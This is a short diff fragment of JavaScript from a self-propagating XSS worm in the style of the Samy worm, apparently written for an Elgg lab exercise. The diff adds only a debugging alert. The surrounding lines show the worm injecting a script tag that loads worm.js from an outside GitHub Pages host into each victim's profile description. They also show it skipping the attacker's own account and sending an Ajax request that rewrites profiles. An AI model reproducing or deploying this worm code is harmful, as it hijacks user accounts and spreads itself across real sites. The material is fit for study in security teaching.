@@ -14,6 +14,7 @@ window.onload = function(){
                 + "&description=<script type="text/javascript" src="https://losmi247.github.io/worm/worm.js"></script>"
                 + "&accesslevel[description]=2" + guid;
   var samyGuid = 59;          
+  alert('here');
   if(elgg.session.user.guid != samyGuid) { // don't overwrite Samy's own 'About Me'
     //Create and send Ajax request to modify profile
     var Ajax = null;
